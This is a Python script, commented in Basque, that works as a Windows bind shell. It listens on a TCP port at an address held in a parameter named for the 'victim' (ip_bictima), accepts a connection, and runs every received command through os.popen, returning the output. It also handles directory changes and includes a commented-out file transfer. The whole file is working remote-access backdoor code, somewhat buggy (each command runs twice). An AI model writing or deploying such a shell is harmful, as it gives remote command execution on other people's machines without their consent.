import os
import socket 
import sys
import threading
import win32api






class server(object):
    def __init__(self,ip_bictima,portua,koneksioak):
        print(ip_bictima)
        print(portua)
        print(koneksioak)
        #scok_Stream(tipo tcp protocolo direcional)
        #scok_Dgram(tipo udp protocolo undirecional)
        #tipos de socket
        #af_inet(ipv4 protrokolo)
        #af_inet6(ipv6 protokolo)
        #af_unix(kernel unix )
        self.so = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.so.bind((ip_bictima,portua))
        self.so.listen(koneksioak)
        self.soc , addr = self.so.accept()
    
    

    def koneksioa(self):
      while True:
          #urla
          url = os.getcwd()
          self.soc.send(bytes(url,encoding = 'utf-8'))
          #comandoa
          erantzuna = "informazio ezezaguna"
          hartuta = self.soc.recv(1024)
          stri = str(hartuta,encoding='utf-8')
          if stri == "itxi":
              break
          comand = stri.split(" ")
          #ruta bideraketa
          print("comandad",comand)
          if comand[0].lower() == "cd":
              if comand[1] == "..":
                url_a = url.split("\\")[:-1]
                url = ""
                for x in url_a:
                  url += x + "\\"
                  os.chdir(url)
              else:
                  lo = ""
                  if len(comand) > 2:
                      print("bai")
                      print("c:",comand[1:3])
                      for x in comand[1:3]:
                          lo += x + " "
                      print("c:",lo)
                      comand[1] = lo
                  ruta_absoluta = False
                  drives = win32api.GetLogicalDriveStrings()
                  rutak = drives.split("\000")[:-1]
                  ar_ruta = comand[1].split("\\")
                  print("ar:",ar_ruta)
                  for disk in rutak:
                      if disk[:-1].lower() == ar_ruta[0]:
                          ruta_absoluta = True
                  print(ruta_absoluta)
                  if ruta_absoluta == True:
                    try:
                        os.chdir(comand[1].lower())
                    except IOError as e:
                        erantzuna = "comandoa gaizki dago"
                  if ruta_absoluta == False:
                      try:
                        print(url)
                        ruta_re = url + "\\" + comand[1]
                        print(ruta_re)
                        os.chdir(ruta_re.lower())  
                      except IOError as e: 
                         erantzuna = "comandoa gaizki dago"
          #datuak bidali eta hartu 
          if comand[0].lower() == "local":
              if comand[1].lower() == "all":
                  print("all")
                  dire = os.path.isdir(url)
                  di = os.listdir(url)
                  for x in di:
                      if os.path.isdir(url + "\\" + x) == True:
                          try:
                           fichategia = open("server.py",'rb')
                           print(fichategia.read())
                          except IOError as e:
                           print("bai")
                  print(di)
              else:
                  print(comand[0].lower())
          #cmd ejekutagarria
          else:
            balioa = os.popen(stri,'r',1).close()
            erantzuna = os.popen(stri,'r',1).read()
            print(erantzuna)
            print(balioa)   
            if balioa == 1:
                erantzuna = "comandoa gaizki dago"
            if balioa == 2:
                erantzuna = "ez dazkazu baimenik"
            if balioa == None and comand[0].lower() == "mkdir" or stri.lower() == "net user *" :
               erantzuna = "informazio ezezaguna"
          #luzehera
          erantzuna_byt = bytes(erantzuna,encoding = 'utf-8') 
          luz = str(sys.getsizeof(erantzuna_byt))
          print("luze_by:",luz)
          self.soc.send(bytes(luz,encoding = 'utf-8')) 
          #datuak cmd 
          self.soc.sendall(bytes(erantzuna,encoding = 'utf-8'))
          self.soc.recv(1024)
          print("time ok")
          #fichategia = open("CURRICULUM.pdf",'rb').read()
          #print(fichategia)
          #self.soc.sendall(fichategia)
      print("agur")
      self.so.close()
      self.soc.close()

ser = server("192.168.0.10",9996,1)
ser.koneksioa()




#recv mezua lortzeko balio du udp protokoloan
#send mezua bidaltzeko balio du udp protokoloan






